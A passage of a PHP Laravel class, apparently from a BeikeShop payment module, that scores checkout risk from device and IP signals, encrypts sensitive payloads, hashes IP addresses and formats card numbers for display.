            json_encode($signals, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES),
            (string) config('app.key')
        );
    }

    private function buildRiskRadar(?string $deviceType, array $signals, int $priorIpCount, int $priorDeviceCount): array
    {
        $score = 8;
        $flags = [];

        if ($priorIpCount > 0) {
            $score += min(30, $priorIpCount * 8);
            $flags[] = 'IP_REUSE';
        }
        if ($priorDeviceCount > 0) {
            $score += min(35, $priorDeviceCount * 10);
            $flags[] = 'DEVICE_REUSE';
        }
        if (($signals['cookieEnabled'] ?? true) === false) {
            $score += 10;
            $flags[] = 'COOKIES_DISABLED';
        }
        if (empty($signals['timezone'])) {
            $score += 8;
            $flags[] = 'TIMEZONE_MISSING';
        }
        if (empty($signals['userAgent']) || empty($signals['platform'])) {
            $score += 10;
            $flags[] = 'DEVICE_SIGNAL_INCOMPLETE';
        }
        if ($deviceType === 'Desktop PC' && (int) ($signals['maxTouchPoints'] ?? 0) >= 5) {
            $score += 7;
            $flags[] = 'TOUCH_DESKTOP_SIGNAL';
        }

        return [min(100, $score), array_values(array_unique($flags))];
    }

    private function encryptSensitive(array $payload): string
    {
        return Crypt::encryptString(
            json_encode($payload, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES)
        );
    }

    private function decryptSensitive(?string $payload): array
    {
        if (! $payload) {
            return [];
        }

        try {
            $decoded = json_decode(Crypt::decryptString($payload), true);

            return is_array($decoded) ? $decoded : [];
        } catch (\Throwable) {
            return [];
        }
    }

    private function hashIp(?string $ip): ?string
    {
        return $ip ? hash_hmac('sha256', $ip, (string) config('app.key')) : null;
    }

    private function formatPan(string $pan, string $brand): string
    {
        if ($brand === 'AMEX') {
            return substr($pan, 0, 4) . ' ' . substr($pan, 4, 6) . ' ' . substr($pan, 10);
        }

        return trim(chunk_split($pan, 4, ' '));
    }

    private function bumpStreamVersion(): void
    {
        Cache::forever('beikeshop_test_stream_version', (string) Str::uuid());
    }
}
